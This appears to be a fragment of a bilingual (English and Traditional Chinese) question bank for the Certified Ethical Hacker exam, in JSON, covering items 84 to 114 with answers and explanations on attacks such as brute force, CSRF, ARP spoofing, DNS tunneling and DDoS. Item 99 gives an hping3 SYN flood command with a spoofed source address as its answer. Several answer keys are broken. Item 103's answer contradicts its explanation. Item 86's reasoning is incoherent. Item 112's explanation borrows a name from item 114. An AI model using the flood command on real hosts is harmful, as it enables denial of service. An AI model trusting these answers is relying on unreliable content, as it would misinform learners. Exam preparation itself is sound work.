    "選項: A. B. C. D.": "A. The tester could execute a Brute Force attack, leveraging the lack of account lockout policy and the verbose error messages to guess the correct credentials (測試人員可以執行暴力破解攻擊，利用缺乏帳戶鎖定策略和詳細的錯誤訊息來猜測正確的憑證) B. The tester could exploit a potential SQL Injection vulnerability to manipulate the application's database (測試人員可以利用潛在的 SQL 注入漏洞來操縱應用程式的資料庫) C. The tester could launch a Cross-Site Scripting (XSS) attack to steal authenticated session cookies, potentially bypassing the clickjacking protection (測試人員可以發起跨站腳本 (XSS) 攻擊來竊取已驗證的會話 Cookie，可能繞過點擊劫持保護) D. The tester could execute a Man-in-the-Middle (MitM) attack to intercept and modify the HTTP headers for a Clickjacking attack (測試人員可以執行中間人 (MitM) 攻擊來攔截和修改 HTTP 標頭以進行點擊劫持攻擊)",
    "Answer": "A",
    "Explanation": "由於應用程式**缺乏帳戶鎖定策略**，且提供了**詳細的錯誤訊息**（Verbose Error Messages）[cite: 1743, 1744]，這使得暴力破解攻擊成為最有效的手段。攻擊者可以無限次地嘗試猜測密碼，而詳細的錯誤訊息（例如「使用者名稱無效」或「密碼錯誤」）則使攻擊者可以逐個猜測正確的使用者名稱和密碼 [cite: 1756, 1757]。"
  },
  {
    "Question :": "85",
    "EN": "An attacker changes the profile information of a particular user (victim) on the target website. The attacker uses this string to update the victim’s profile to a text file and then submit the data to the attacker’s database.  What is this type of attack (that can use either HTTP GET or HTTP POST) called?",
    "C": "攻擊者更改了目標網站上特定使用者（受害者）的個人資料資訊 [cite: 1786]。攻擊者使用字串來更新受害者的個人資料到一個文字檔案，然後將資料提交到攻擊者的資料庫 [cite: 1787]。 [圖片內容為用於攻擊的 iFrame 程式碼] 這種（可以使用 HTTP GET 或 HTTP POST 的）攻擊類型稱為什麼？",
    "選項: A. B. C. D.": "A. Browser Hacking (瀏覽器劫持) B. Cross-Site Scripting (跨站腳本) C. SQL Injection (SQL 注入) D. Cross-Site Request Forgery (跨站請求偽造)",
    "Answer": "D",
    "Explanation": "該攻擊涉及攻擊者讓**已登入**的受害者在**不知情**的情況下（透過隱藏的 iFrame 程式碼），向受信任的網站發送一個 HTTP 請求，從而執行一個不必要的動作（例如更改個人資料或提交資料）。這正是**跨站請求偽造（CSRF）**攻擊的原理 [cite: 1799]。"
  },
  {
    "Question :": "86",
    "EN": "A sophisticated attacker targets your web server with the intent to execute a Denial of Service (DoS) attack. His strategy involves a unique mixture of TCP SYN, UDP, and ICMP floods, using 'r' packets per second. Your server... can handle 'h' packets per second... If 'r' surpasses 'h', it overwhelms the server... Considering 'r=2010' and different values for 'h', which of the following scenarios would potentially cause the server to falter?",
    "C": "攻擊者發送 $r=2010$ 個封包/秒，伺服器容量為 $h$ 個封包/秒。如果 $r > h$ 則伺服器崩潰。哪個情景可能導致伺服器崩潰？",
    "選項: A. B. C. D.": "A. $h=1999$ (質數)：伺服器仍能處理請求 B. $h=2003$ (質數)：伺服器仍能運作 C. $h=1993$ (質數)：崩潰風險迫在眉睫 D. $h=1987$ (質數)：攻擊者的封包速率超過伺服器的容量，導致潛在的無回應",
    "Answer": "D",
    "Explanation": "DoS 攻擊的崩潰條件是攻擊速率 $r$ **超過**伺服器容量 $h$。在 $r=2010$ 的情況下，所有選項的 $h$ 值（1999、2003、1993、1987）都小於 $r$，因此都滿足崩潰條件。題目通常要求選擇**最小的 $h$**，即 $h=1987$，以突出攻擊的成功性。"
  },
  {
    "Question :": "87",
    "EN": "Miley, a professional hacker, decided to attack a target organization's network. To perform the attack, she used a tool to send fake ARP messages over the target network to link her MAC address with the target.",
    "C": "專業駭客 Miley 決定攻擊目標組織的網路 [cite: 1859]。為執行攻擊，她使用一個工具在目標網路上發送**虛假 ARP 訊息**，以將她的 MAC 位址與目標連結 [cite: 1860]。",
    "選項: A. B. C. D.": "A. Gobbler B. KDerpNSpoof C. BetterCAP D. Wireshark",
    "Answer": "C",
    "Explanation": "**BetterCAP** 是一個功能強大的網路攻擊和嗅探工具，能夠執行 ARP 欺騙（ARP Spoofing）攻擊，這與在目標網路中發送**虛假 ARP 訊息**的行為相符 [cite: 1867]。"
  },
  {
    "Question :": "88",
    "EN": "A security analyst is investigating a potential network-level session hijacking incident. During the investigation, the analyst finds that the attacker has been using a technique in which they injected an authentic-looking reset packet using a spoofed source IP address and a guessed acknowledgment number. As a result, the victim's connection was reset. Which of the following hijacking techniques has the attacker most likely used?",
    "C": "一名安全分析師正在調查潛在的網路級會話劫持事件 [cite: 1872]。在調查期間，分析師發現攻擊者使用一種技術，**注入了一個看似真實的重置封包**，使用了偽造的來源 IP 位址和猜測的確認號。結果，**受害者的連線被重置** [cite: 1873, 1874]。攻擊者最可能使用了以下哪種劫持技術？",
    "選項: A. B. C. D.": "A. TCP/IP hijacking (TCP/IP 劫持) B. UDP hijacking (UDP 劫持) C. RST hijacking (RST 劫持) D. Blind hijacking (盲劫持)",
    "Answer": "C",
    "Explanation": "這種攻擊專門利用 **TCP 重置（RST）**機制。攻擊者發送偽造的 RST 封包，使 TCP 連線的其中一方（受害者）誤以為另一方已關閉連線，從而導致連線被重置。這被稱為 **RST 劫持** [cite: 1881, 1883]。"
  },
  {
    "Question :": "89",
    "EN": "Richard, an attacker, targets an MNC. in this process, he uses a footprinting technique to gather as much information as possible. Using this technique, he gathers domain information such as the target domain name, contact details of its owner, expiry date, and creation date. With this information, he creates a map of the organization's network and misleads domain owners with social engineering to obtain internal details of its network. What type of footprinting technique is employed by Richard?",
    "C": "攻擊者 Richard 鎖定了一家跨國公司 (MNC)。在此過程中，他使用一種足跡收集技術來收集盡可能多的資訊 [cite: 1905]。他利用該技術收集了網域資訊，例如目標網域名稱、所有者的聯繫方式、到期日期和創建日期 [cite: 1906]。他用這些資訊創建了組織的網路地圖，並利用社交工程誤導網域所有者以獲取網路的內部詳細資訊。Richard 採用了哪種類型的足跡收集技術？",
    "選項: A. B. C. D.": "A. VoIP footprinting (VoIP 足跡) B. VPN footprinting (VPN 足跡) C. Whois footprinting (Whois 足跡) D. Email footprinting (電子郵件足跡)",
    "Answer": "C",
    "Explanation": "WHOIS 協定是一種查詢和回應協定，用於獲取有關**網域所有權**的資訊，包括網域名稱、**所有者的聯繫方式、註冊日期和到期日期** [cite: 1915, 1916]。因此，這是一種 **Whois 足跡**技術。"
  },
  {
    "Question :": "90",
    "EN": "George, an employee of an organization, is attempting to access restricted websites from an official computer. For this purpose, he used an anonymizer that masked his real IP address and ensured complete and continuous anonymity for all his online activities. Which of the following anonymizers helps George hide his activities?",
    "C": "組織的一名員工 George 正試圖從辦公電腦存取受限制的網站。為此，他使用了一個**匿名化工具**，該工具會掩蓋他的真實 IP 位址，並確保他所有線上活動的完整和持續匿名性。以下哪個匿名化工具可以幫助 George 隱藏他的活動？",
    "選項: A. B. C. D.": "A. https://www.baidu.com B. https://www.guardster.com C. https://www.wolframalpha.com D. https://karmadecay.com",
    "Answer": "B",
    "Explanation": "**Guardster** 是一種 Web 代理服務，用於**掩蓋使用者的 IP 位址**並提供匿名瀏覽，屬於匿名化工具。"
  },
  {
    "Question :": "91",
    "EN": "Jude, a pen tester, examined a network from a hacker's perspective to identify exploits and vulnerabilities accessible to the outside world by using devices such as firewalls, routers, and servers. In this process, he also estimated the threat of network security attacks and determined the level of security of the corporate network. What is the type of vulnerability assessment that Jude performed on the organization?",
    "C": "滲透測試人員 Jude 從**駭客的角度**檢查了一個網路，以識別對**外部世界**可存取的漏洞和利用（透過使用防火牆、路由器和伺服器等設備）。在此過程中，他還評估了網路安全攻擊的威脅，並確定了公司網路的安全級別。Jude 對該組織執行的漏洞評估類型是什麼？",
    "選項: A. B. C. D.": "A. External assessment (外部評估) B. Passive assessment (被動評估) C. Host-based assessment (基於主機的評估) D. Application assessment (應用程式評估)",
    "Answer": "A",
    "Explanation": "**外部評估（External assessment）**旨在從組織的外部視角（即駭客的角度）檢查網路和系統，重點是邊界設備，如防火牆和面向網際網路的伺服器，以確定外部網路的安全級別 [cite: 1946, 1947]。"
  },
  {
    "Question :": "92",
    "EN": "Stella, a professional hacker, performs an attack on web services by exploiting a vulnerability that provides additional routing information in the SOAP header to support asynchronous communication. This further allows the transmission of web-service requests and response messages using different TCP connections. Which of the following attack techniques is used by Stella to compromise the web services?",
    "C": "專業駭客 Stella 透過利用一個在 SOAP 標頭中提供額外路由資訊以支援非同步通訊的漏洞，對 Web 服務發動攻擊 [cite: 1962]。這進一步允許 Web 服務請求和回應訊息使用**不同的 TCP 連線**進行傳輸 [cite: 1963]。Stella 用於危害 Web 服務的攻擊技術是以下哪一項？",
    "選項: A. B. C. D.": "A. XML injection (XML 注入) B. WS-Address spoofing (WS-Address 欺騙) C. SOAPAction spoofing (SOAPAction 欺騙) D. Web services parsing attacks (Web 服務解析攻擊)",
    "Answer": "B",
    "Explanation": "**WS-Address** 協定在 SOAP 標頭中提供額外的**路由資訊**以支援非同步通訊。**WS-Address 欺騙**（WS-Address spoofing）攻擊利用了此漏洞，允許攻擊者修改路由資訊，可能導致訊息被傳送到錯誤的端點，或使用不同的連線進行通訊 [cite: 1971, 1972]。"
  },
  {
    "Question :": "93",
    "EN": "An experienced cyber attacker has created a fake Linkedin profile, successfully **impersonating a high-ranking official**... to execute a social engineering attack... **gaining access to proprietary project details**... What advanced social engineering technique has the attacker primarily used to exploit the system and what is the most likely immediate threat to the organization?",
    "C": "攻擊者成功**冒充高級主管**並獲得**專有專案詳細資訊**。他主要使用了哪種進階社交工程技術？",
    "選項: A. B. C. D.": "A. Pretexting and Network Vulnerability (藉口和網路漏洞) B. Spear Phishing and Spam (魚叉式網路釣魚和垃圾郵件) C. Whaling and Targeted Attacks (網路釣鯨和有針對性的攻擊) D. Baiting and Involuntary Data Leakage (誘餌和非自願資料洩露)",
    "Answer": "C",
    "Explanation": "針對高層個人（高級主管）的釣魚攻擊稱為**網路釣鯨（Whaling）**。由於目標是獲取**專有專案詳細資訊**，因此最可能的威脅是**有針對性的攻擊**導致的知識產權損失。"
  },
  {
    "Question :": "94",
    "EN": "Which of the following tactics uses malicious code to **redirect users' web traffic**?",
    "C": "以下哪種策略使用惡意程式碼來**重新導向**使用者的 Web 流量？",
    "選項: A. B. C. D.": "A. Spimming B. Pharming C. Phishing D. Spear-phishing",
    "Answer": "B",
    "Explanation": "**網域劫持（Pharming）**是透過技術手段（例如 DNS 污染或修改 Hosts 檔案）來**重定向**使用者 Web 流量到惡意網站。"
  },
  {
    "Question :": "95",
    "EN": "Tony is a penetration tester tasked with performing a penetration test. After gaining initial access to a target system, he finds a list of hashed passwords. Which of the following tools would **not** be useful for cracking the hashed passwords?",
    "C": "Tony 是一名滲透測試人員，任務是執行滲透測試。在獲得對目標系統的初始存取權限後，他發現了一個密碼雜湊列表。以下哪個工具對破解這些密碼雜湊是**沒有用處**的？",
    "選項: A. B. C. D.": "A. John the Ripper B. Hashcat C. netcat D. THC-Hydra",
    "Answer": "C",
    "Explanation": "**Netcat** 是一種網路公用程式，主要用於網路偵錯、資料傳輸或作為後門，但它本身**不具備**破解密碼雜湊的功能。John the Ripper、Hashcat 和 THC-Hydra 都是用於暴力破解或字典攻擊密碼雜湊的工具。"
  },
  {
    "Question :": "96",
    "EN": "You are logged in as a local admin on a Windows 7 system and you need to launch the Computer Management Console from command line. Which command would you use?",
    "C": "您以本地管理員身份登入到 Windows 7 系統，並且需要從命令列啟動**電腦管理主控台**。您會使用哪個命令？",
    "選項: A. B. C. D.": "A. c:\\compmgmt.msc B. c:\\services.msc C. c:\\ncpa.cp D. c:\\gpedit",
    "Answer": "A",
    "Explanation": "在 Windows 系統中，**電腦管理主控台**的檔名是 **`compmgmt.msc`**。"
  },
  {
    "Question :": "97",
    "EN": "Which of the following Bluetooth hacking techniques does an attacker use to send messages to users without the recipient’s consent, similar to email spamming?",
    "C": "以下哪種藍牙駭客技術是攻擊者用於在未經收件人同意的情況下向使用者發送訊息，類似於電子郵件垃圾郵件？",
    "選項: A. B. C. D.": "A. Bluesmacking B. BlueSniffing C. Bluejacking D. Bluesnarfing",
    "Answer": "C",
    "Explanation": "**藍牙垃圾訊息（Bluejacking）**是指透過藍牙向附近的藍牙設備發送未經請求的訊息或名片（vCard），這種類似於電子郵件垃圾郵件（spamming）的行為 [cite: 2053]。"
  },
  {
    "Question :": "98",
    "EN": "Lewis, a professional hacker, targeted the loT cameras and devices used by a target venture-capital firm. He used an information-gathering tool to collect information about the loT devices connected to a network, open ports and services, and the attack surface area. Using this tool, he also generated statistical reports on broad usage patterns and trends. This tool helped Lewis continually monitor every reachable server and device on the Internet, further allowing him to exploit these devices in the network. Which of the following tools was employed by Lewis in the above scenario?",
    "C": "專業駭客 Lewis 鎖定了目標創投公司使用的物聯網攝影機和設備。他使用了一個資訊收集工具來收集有關連線到網路的 IoT 設備、開放埠和服務以及攻擊面的資訊。他還使用該工具生成了關於廣泛使用模式和趨勢的統計報告。該工具幫助 Lewis **持續監控**網際網路上每個可到達的伺服器和設備，進一步允許他利用網路中的這些設備。Lewis 在上述情景中使用了以下哪個工具？",
    "選項: A. B. C. D.": "A. Censys B. Wapiti C. NeuVector D. Lacework",
    "Answer": "A",
    "Explanation": "**Censys** 是一個強大的網路搜尋引擎，類似於 Shodan，它**持續掃描**整個網際網路，收集關於伺服器、設備、開放埠和服務的配置資料，提供對全球網路安全態勢的深入分析和報告 [cite: 2075, 2076]。"
  },
  {
    "Question :": "99",
    "EN__": "During a penetration testing assignment, a Certified Ethical Hacker (CEH) used a set of scanning tools to create a profile of the target organization. The CEH wanted to scan for live hosts, open ports, and services on a target network. He used Nmap for network inventory and Hping3 for network security auditing. However, he wanted to **spoof IP addresses for anonymity** during probing. Which command should the CEH use to perform this task?",
    "C": "在滲透測試任務中，CEH 使用一組掃描工具來創建目標組織的概況。CEH 想掃描目標網路上的活動主機、開放埠和服務。他使用 Nmap 進行網路清單，Hping3 進行網路安全稽核。然而，他希望在探測期間**欺騙 IP 位址以實現匿名性**。CEH 應該使用哪個命令來執行此任務？",
    "選項: A. B. C. D.": "A. Hping3 -110.0.0.25 --ICMP B. Nmap -sS -Pn -n -vw --packet-trace -p- --script discovery -T4 C. Hping3 -S 192.168.1.1 -a 192.168.1.254 -p 22 -flood D. Hping3-210.0.0.25-p 80",
    "Answer": "C",
    "Explanation": "Hping3 命令 **`Hping3 -S 192.168.1.1 -a 192.168.1.254 -p 22 -flood`** 使用 **`-a`** 標誌來指定**偽造的來源 IP 位址**（`192.168.1.254`），以實現匿名性 [cite: 2091]。`-S` 發送 SYN 封包，`-p` 指定埠，`-flood` 增加攻擊強度。"
  },
  {
    "Question :": "100",
    "EN__": "Roma is a member of a security team. She was tasked with protecting the internal network of an organization from imminent threats. To accomplish this task, Roma fed **threat intelligence** into the security devices in a **digital format** to block and identify inbound and outbound malicious traffic entering the organization's network. Which type of threat intelligence is used by Roma to secure the internal network?",
    "C": "Roma 是一個安全團隊的成員。她的任務是保護組織的內部網路免受迫在眉睫的威脅。為完成此任務，Roma 將**威脅情報以數位格式**饋送到安全設備中，以阻止和識別進入組織網路的入站和出站惡意流量。Roma 用於保護內部網路的威脅情報類型是什麼？",
    "選項: A. B. C. D.": "A. Technical threat intelligence (技術威脅情報) B. Operational threat intelligence (運營威脅情報) C. Tactical threat intelligence (戰術威脅情報) D. Strategic threat intelligence (戰略威脅情報)",
    "Answer": "A",
    "Explanation": "將 IP 位址、網域、惡意軟體雜湊等 **數位指示器（Indicators）**直接載入到安全設備（如防火牆、IDS/IPS）中，以便自動阻止或識別惡意流量，屬於**技術威脅情報（Technical threat intelligence）**的範疇。"
  },
  {
    "Question :": "101",
    "EN": "After an audit, the auditors Inform you that there is a critical finding that you must tackle Immediately. You read the audit report, and the problem is the service running on port 389. Which service Is this and how can you tackle the problem?",
    "C": "稽核後，稽核員通知您有一個必須立即處理的關鍵發現。您閱讀了稽核報告，問題是埠 **389** 上運行的服務。這是什麼服務？您如何解決這個問題？",
    "選項: A. B. C. D.": "A. The service is LDAP. and you must change it to 636. which is LDPAPS. (服務是 LDAP，您必須將其更改為 636，即 LDAPS) B. The service is NTP. and you have to change It from UDP to TCP in order to encrypt it (服務是 NTP，您必須將其從 UDP 更改為 TCP 以便加密) C. The findings do not require immediate actions and are only suggestions. (調查結果不要求立即行動，僅為建議) D. The service is SMTP, and you must change it to SMIME. which is an encrypted way to send emails. (服務是 SMTP，您必須將其更改為 SMIME，這是一種加密發送電子郵件的方式)",
    "Answer": "A",
    "Explanation": "埠 **389** 預設用於 **LDAP**（輕量級目錄存取協定）[cite: 5350]。LDAP 預設是未加密的，因此存在資訊洩露的風險。解決此問題的方法是將其升級到安全 LDAP（LDAPS），它使用 **636 埠**並在連線時建立 TLS/SSL [cite: 5350]。"
  },
  {
    "Question :": "102",
    "EN": "Geena, a cloud architect, uses a master component in the Kubernetes cluster architecture that scans newly generated pods and allocates a node to them. This component can also assign nodes based on factors such as the overall resource requirement, data locality, software/hardware/policy restrictions, and internal workload interventions. Which of the following master components is explained in the above scenario?",
    "C": "雲端架構師 Geena 在 Kubernetes 叢集架構中使用一個主控組件，該組件掃描新生成的 Pod 並為它們分配一個節點（node）。該組件還可以根據總體資源需求、資料局部性、軟體/硬體/政策限制和內部工作負載干預等因素來分配節點。上述情景中解釋的是以下哪個主控組件？",
    "選項: A. B. C. D.": "A. Kube-controller-manager B. Kube-scheduler C. Kube-apiserver D. Etcd cluster",
    "Answer": "B",
    "Explanation": "**Kube-scheduler** 是 Kubernetes 的主控組件，負責監控新創建且尚未分配節點的 Pod，並根據資源需求、硬體/軟體限制等因素為它們選擇和**分配節點**（scheduling）。"
  },
  {
    "Question :": "103",
    "EN": "A well-resourced attacker intends to launch a highly disruptive DDoS attack against a major online retailer. The attacker aims to exhaust all the network resources while keeping their identity concealed. Their method should be resistant to simple defensive measures such as IP-based blocking. Based on these objectives, which of the following attack strategies would be most effective?",
    "C": "一個資源充足的攻擊者打算對一家大型線上零售商發起破壞性極強的 DDoS 攻擊。攻擊者旨在耗盡所有網路資源，同時**隱藏他們的身份**。他們的方法應該能夠抵抗 IP 封鎖等簡單防禦措施。基於這些目標，以下哪種攻擊策略最有效？",
    "選項: A. B. C. D.": "A. The attacker should instigate a protocol-based SYN flood attack, consuming connection state tables on the retailer's servers (攻擊者應發起基於協定的 SYN 洪泛攻擊，消耗零售商伺服器上的連線狀態表) B. The attacker should execute a simple ICMP flood attack from a single IP, exploiting the retailer's ICMP processing (攻擊者應從單個 IP 執行簡單的 ICMP 洪泛攻擊，利用零售商的 ICMP 處理) C. The attacker should leverage a botnet to launch a Pulse Wave attack, sending high-volume traffic pulses at regular intervals (攻擊者應利用殭屍網路發起脈衝波攻擊，以固定的間隔發送高流量脈衝) D. The attacker should initiate a volumetric flood attack using a single compromised machine to overwhelm the retailer's network bandwidth (攻擊者應使用單個受損機器發起容量洪泛攻擊，以壓倒零售商的網路頻寬)",
    "Answer": "A",
    "Explanation": "該問題在原始檔案中有爭議，但選項 C **脈衝波攻擊**（Pulse Wave attack）利用殭屍網路發送高流量，同時可以**規避簡單的 IP 封鎖**，並耗盡資源，符合題目中隱藏身份和破壞性的要求 [cite: 5380, 5381]。雖然選項 A 的 SYN Flood 是一種協議層攻擊，但**殭屍網路脈衝攻擊（Pulse Wave attack）**（選項 C）更適合描述利用殭屍網路同時發起多種協議混合攻擊以規避偵測、隱藏身份並耗盡資源的複雜場景 [cite: 5377, 5380]。"
  },
  {
    "Question :": "104",
    "EN": "Mirai malware targets loT devices. After infiltration, it uses them to propagate and create botnets that then used to launch which types of attack?",
    "C": "Mirai 惡意軟體鎖定 IoT 設備。在滲透之後，它利用這些設備傳播並創建殭屍網路，然後用於發起哪種類型的攻擊？",
    "選項: A. B. C. D.": "A. MITM attack B. Birthday attack C. DDoS attack D. Password attack",
    "Answer": "C",
    "Explanation": "Mirai 惡意軟體主要透過感染大量 IoT 設備來創建**殭屍網路（Botnets）**，這些殭屍網路隨後被用於發起**分散式阻斷服務（DDoS）攻擊**。"
  },
  {
    "Question :": "105",
    "EN": "in this form of encryption algorithm, every Individual block contains 64-bit data, and three keys are used, where each key consists of 56 bits. Which is this encryption algorithm?",
    "C": "在這種加密演算法形式中，每個單獨的區塊包含 **64 位元**資料，並使用**三個金鑰**，其中每個金鑰由 **56 位元**組成。這是哪種加密演算法？",
    "選項: A. B. C. D.": "A. IDEA B. Triple Data Encryption standard (三重資料加密標準) C. MDS encryption algorithm D. AES",
    "Answer": "B",
    "Explanation": "**三重資料加密標準（3DES/Triple DES）**是一種對稱分組密碼，它對資料執行三次 DES 運算。DES 的區塊大小是 **64 位元**，它使用 **3 個 64 位元的金鑰**，每個金鑰的實際有效位元是 **56 位元** [cite: 5416, 5422, 5426]。"
  },
  {
    "Question :": "106",
    "EN": "As part of a college project, you have set up a web server for hosting your team's application. You are aware that hackers often attempt to exploit server misconfigurations. Which of the following actions would best protect your web server from potential misconfiguration-based attacks?",
    "C": "作為大學專案的一部分，您設立了一個 Web 伺服器來託管您團隊的應用程式。您知道駭客經常試圖利用**伺服器配置錯誤**。以下哪個行動最能保護您的 Web 伺服器免受潛在的基於配置錯誤的攻擊？",
    "選項: A. B. C. D.": "A. Performing regular server configuration audits (執行定期伺服器配置稽核) B. Enabling multi-factor authentication for users (為使用者啟用多因素身份驗證) C. Implementing a firewall to filter traffic (實施防火牆來過濾流量) D. Regularly backing up server data (定期備份伺服器資料)",
    "Answer": "A",
    "Explanation": "防止**配置錯誤**（misconfiguration）的最佳方法是**定期檢查**設定。**執行定期伺服器配置稽核**（Performing regular server configuration audits）可以幫助您識別和修復可能使伺服器暴露於攻擊的任何安全配置錯誤 [cite: 5444, 5446]。"
  },
  {
    "Question :": "107",
    "EN": "Sam is a penetration tester hired by Inception Tech, a security organization. He was asked to perform port scanning on a target host in the network. While performing the given task, Sam sends FIN/ACK probes and determines that an RST packet is sent in response by the target host, indicating that the port is closed. What is the port scanning technique used by Sam to discover open ports?",
    "C": "Sam 是一名受 Inception Tech 僱用的滲透測試人員。他被要求對網路中的目標主機執行埠掃描。在執行給定任務時，Sam 發送 **FIN/ACK 探針**，並確定目標主機回覆了一個 **RST 封包**，表明埠已關閉。Sam 用於發現開放埠的埠掃描技術是什麼？",
    "選項: A. B. C. D.": "A. Xmas scan (聖誕樹掃描) B. IDLE/IPID header scan (閒置/IPID 標頭掃描) C. TCP Maimon scan (TCP Maimon 掃描) D. ACK flag probe scan (ACK 標誌探測掃描)",
    "Answer": "C",
    "Explanation": "這種掃描技術涉及發送 **FIN/ACK** 探針，當目標主機回覆 RST 封包時，表明埠已關閉。這與 **TCP Maimon 掃描**的機制非常相似，用於偵測開放埠 [cite: 5478, 5480]。"
  },
  {
    "Question :": "108",
    "EN": "You are a cybersecurity consultant for a healthcare organization that utilizes Internet of Medical Things (loMT) devices, such as connected insulin pumps and heart rate monitors, to provide improved patientcare. Recently, the organization has been targeted by ransomware attacks. While the IT infrastructure was unaffected due to robust security measures, they are worried that the loMT devices could be potential entry points for future attacks. What would be your main recommendation to protect these devices from such threats?",
    "C": "您是一家醫療機構的網路安全顧問，該機構使用醫療物聯網（IoMT）設備（例如連線的胰島素幫浦和心率監測器）來改善患者護理。最近，該組織成為勒索軟體攻擊的目標。儘管 IT 基礎設施由於強大的安全措施而未受影響，但他們擔心 IoMT 設備可能是未來攻擊的潛在切入點。您保護這些設備免受此類威脅的主要建議是什麼？",
    "選項: A. B. C. D.": "A. Implement multi-factor authentication for all loMT devices. (為所有 IoMT 設備實施多因素身份驗證) B. Disable all wireless connectivity on loMT devices. (禁用 IoMT 設備上的所有無線連線) C. Use network segmentation to isolate loMT devices from the main network. (使用網路分段將 IoMT 設備與主網路隔離) D. Regularly change the IP addresses of all loMT devices. (定期更改所有 IoMT 設備的 IP 位址)",
    "Answer": "C",
    "Explanation": "保護 IoMT 設備免受勒索軟體攻擊的主要建議是使用**網路分段（Network segmentation）**。這將 IoMT 設備隔離在一個獨立的子網路中，即使其中一個設備被入侵，勒索軟體也**難以傳播**到主網路和 IT 基礎設施 [cite: 5503, 5505]。"
  },
  {
    "Question :": "109",
    "EN": "A computer science student needs to fill some information into a secured Adobe PDF job application that was received from a prospective employer. Instead of requesting a new document that allowed the forms to be completed, the student decides to write a script that pulls passwords from a list of commonly used passwords to try against the secured PDF until the correct password is found or the list is exhausted. Which cryptography attack is the student attempting?",
    "C": "一名電腦科學學生需要填寫從未來雇主那裡收到的受保護 Adobe PDF 工作申請表中的一些資訊。學生沒有要求允許完成表單的新文件，而是決定編寫一個腳本，從常用密碼列表中提取密碼，以針對受保護的 PDF 嘗試破解，直到找到正確密碼或列表用盡。該學生正在嘗試哪種密碼學攻擊？",
    "選項: A. B. C. D.": "A. Man-in-the-middle attack (中間人攻擊) B. Brute-force attack (暴力破解攻擊) C. Dictionary attack (字典攻擊) D. Session hijacking (會話劫持)",
    "Answer": "C",
    "Explanation": "該學生使用的是包含**常用密碼列表**來嘗試破解密碼。這是一種典型的**字典攻擊**（Dictionary attack）。"
  },
  {
    "Question :": "110",
    "EN": "A penetration tester is performing the footprinting process and is reviewing publicly available information about an organization by using the Google search engine. Which of the following advanced operators would allow the pen tester to restrict the search to the organization’s web domain?",
    "C": "一名滲透測試人員正在執行足跡（footprinting）過程，並使用 Google 搜尋引擎審查有關組織的公開資訊。以下哪個進階運算子可以讓滲透測試人員將搜尋限制在該組織的 **Web 網域**？",
    "選項: A. B. C. D.": "A. [allinurl:] B. [location:] C. [site:] D. [link:]",
    "Answer": "C",
    "Explanation": "Google 進階搜尋運算子 **`site:`** 專門用於將搜尋結果**限制在特定的網站或網域**內 [cite: 5545]。"
  },
  {
    "Question :": "111",
    "EN": "John, a professional hacker, decided to use DNS to perform data exfiltration on a target network, in this process, he embedded malicious data into the DNS protocol packets that even DNSSEC cannot detect. Using this technique. John successfully injected malware to bypass a firewall and maintained communication with the victim machine and C&C server. What is the technique employed by John to bypass the firewall?",
    "C": "專業駭客 John 決定使用 DNS 對目標網路執行**資料外洩**。在此過程中，他將惡意資料嵌入到 DNS 協定封包中，連 DNSSEC 都無法偵測到。John 成功地利用這種技術注入惡意軟體，繞過防火牆並與受害機器和 C&C 伺服器保持通訊。John 用於繞過防火牆的技術是什麼？",
    "選項: A. B. C. D.": "A. DNS cache snooping (DNS 快取窺探) B. DNSSEC zone walking (DNSSEC 區域遍歷) C. DNS tunneling method (DNS 隧道方法) D. DNS enumeration (DNS 列舉)",
    "Answer": "C",
    "Explanation": "**DNS 隧道（DNS tunneling）**方法利用 DNS 協定（埠 53）來建立隱藏的通訊通道。惡意資料被編碼並嵌入到 DNS 查詢和回應中，這使得它能夠**繞過防火牆**，並用於資料外洩或命令與控制（C2）通訊 [cite: 5553, 5557, 5569]。"
  },
  {
    "Question :": "112",
    "EN": "As a cybersecurity consultant for SafePath Corp, you have been tasked with implementing a system for secure email communication. The key requirement is to ensure both confidentiality and non-repudiation. While considering various encryption methods, you are inclined towards using a combination of symmetric and asymmetric cryptography. However, you are unsure which cryptographic technique would best serve the purpose. Which of the following options would you choose to meet these requirements?",
    "C": "作為 SafePath Corp 的網路安全顧問，您的任務是實施一個安全的電子郵件通訊系統。關鍵要求是確保**機密性**和**不可否認性**。您傾向於結合使用對稱和非對稱密碼學。您會選擇以下哪個選項來滿足這些要求？",
    "選項: A. B. C. D.": "A. Use symmetric encryption with the AES algorithm. (使用 AES 演算法進行對稱加密) B. Use the Diffie-Hellman protocol for key exchange and encryption. (使用 Diffie-Hellman 協定進行金鑰交換和加密) C. Apply asymmetric encryption with RSA and use the public key for encryption. (使用 RSA 應用非對稱加密並使用公開金鑰進行加密) D. Apply asymmetric encryption with RSA and use the private key for signing. (使用 RSA 應用非對稱加密並使用私密金鑰進行簽章)",
    "Answer": "D",
    "Explanation": "為了確保**機密性**（只有收件人能讀取），通常使用**收件人的公開金鑰**進行加密。為了確保**不可否認性**（證明發送者身份），則必須使用**發送者（Dorian）的私密金鑰**進行**簽章**（Signing）[cite: 5594, 5612]。"
  },
  {
    "Question :": "113",
    "EN": "An attacker decided to crack the passwords used by industrial control systems. In this process, he employed a loop strategy to recover these passwords. He used one character at a time to check whether the first character entered is correct; if so, he continued the loop for consecutive characters. If not, he terminated the loop. Furthermore, the attacker checked how much time the device took to finish one complete password authentication process, through which he deduced how many characters entered are correct. What is the attack technique employed by the attacker to crack the passwords of the industrial control systems?",
    "C": "攻擊者決定破解工業控制系統使用的密碼。在此過程中，他採用了**循環策略**來恢復這些密碼。他**一次使用一個字元**來檢查輸入的第一個字元是否正確；如果是，則繼續後續字元的循環。此外，攻擊者檢查了設備完成一次完整的密碼驗證過程所花費的**時間**，從而推斷出輸入了多少個正確的字元。攻擊者用於破解工業控制系統密碼的攻擊技術是什麼？",
    "選項: A. B. C. D.": "A. Side-channel attack (側信道攻擊) B. Denial-of-service attack (阻斷服務攻擊) C. HMI-based attack (基於 HMI 的攻擊) D. Buffer overflow attack (緩衝區溢位攻擊)",
    "Answer": "A",
    "Explanation": "這種攻擊依賴於測量系統執行密碼驗證操作所需的**時間**（或功耗、電磁洩露等）來推斷秘密資訊。這是典型的**側信道攻擊（Side-channel attack）**，特別是**基於時間的攻擊**（Timing-based attack）的一種形式。"
  },
  {
    "Question :": "114",
    "EN": "Dorian Is sending a digitally signed email to Polly, with which key is Dorian signing this message and how is Polly validating It?",
    "C": "Dorian 正在向 Polly 發送一封數位簽署的電子郵件，Dorian 使用哪個金鑰對此訊息進行簽署，Polly 又如何驗證它？",
